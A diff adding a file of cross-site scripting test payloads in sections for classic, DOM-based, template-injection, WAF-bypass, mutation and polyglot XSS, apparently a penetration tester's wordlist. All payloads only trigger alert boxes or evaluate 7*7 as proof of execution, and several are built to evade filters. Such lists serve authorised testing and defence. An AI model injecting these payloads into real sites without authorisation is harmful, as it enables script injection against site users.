@@ -1,0 +1,61 @@
+# XSS Payloads
+
+# Classic XSS
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# DOM-based XSS
+javascript:alert(document.domain)
+JaVaScRiPt:alert(1)
+javascript&#58;alert(1)
+javascript&#0058;alert(1)
+javascript&#x3a;alert(1)
+'-alert(1)-'
+';alert(1);//
+";alert(1);//
+
+# Template Injection
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{_c.constructor('alert(1)')()}}
+${alert(1)}
+${{alert(1)}}
+#{alert(1)}
+#{{alert(1)}}
+{{alert(1)}}
+{{7*7}}
+${7*7}
+#{7*7}
+
+# WAF Bypass
+<svg><script>alert&#40;1&#41</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=alert`1`>
+<svg/onload=alert(1)>
+<iframe srcdoc='<script>alert(1)</script>'>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+
+# Mutation XSS
+<noscript><p title='</noscript><img src=x onerror=alert(1)>'>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<select><option></select><img src=x onerror=alert(1)>
+
+# Polyglot
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+# Context Detection
+'';!--"<XSS>=&{()}
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<input autofocus onblur=alert(1)>
